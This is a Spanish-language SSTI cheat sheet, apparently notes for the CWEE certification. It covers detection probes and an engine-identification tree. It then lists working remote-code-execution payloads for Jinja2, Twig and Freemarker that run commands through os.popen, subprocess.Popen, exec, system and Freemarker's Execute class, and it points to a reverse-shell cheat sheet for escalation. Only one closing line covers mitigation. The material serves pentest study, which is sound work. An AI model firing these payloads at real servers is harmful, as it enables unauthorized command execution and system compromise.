# SSTI (Server-Side Template Injection)

La entrada de usuario se concatena en una plantilla renderizada en servidor
(`render_template_string`, Twig, Freemarker, Velocity, etc.) → de reflejo a RCE.

## Detección

```
${7*7}        {{7*7}}        <%= 7*7 %>        #{7*7}        ${{7*7}}
```

Si `{{7*7}}` → `49` en la respuesta, hay SSTI. Identifica el motor con el árbol
de decisión de PayloadsAllTheThings:

```
{{7*7}}  = 49   → Jinja2 / Twig
{{7*'7'}}       → 7777777 (Jinja2)  |  49 (Twig)
${7*7}   = 49   → Freemarker / Velocity / Mako
```

## Jinja2 (Python / Flask) — el más común en CWEE

Confirmación y escalada:

```python
{{ config }}                         # fugas de configuración
{{ ''.__class__.__mro__ }}           # explorar cadena de clases
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

Variante lookup clásica (subclasses → cargar `os`):

```python
{{ ''.__class__.__mro__[1].__subclasses__() }}
# localiza el índice de subprocess.Popen y:
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate() }}
```

## Twig (PHP)

```
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
{{ ['id']|filter('system') }}
```

## Freemarker (Java)

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

## De SSTI a reverse shell

Una vez tengas ejecución de comandos, lanza el reverse shell del cheatsheet
[12-shells-pivoting.md](12-shells-pivoting.md).

## Mitigación

No pasar entrada de usuario como plantilla; usar renderizado con contexto de
datos (no `render_template_string` sobre input), sandbox del motor, allowlist.
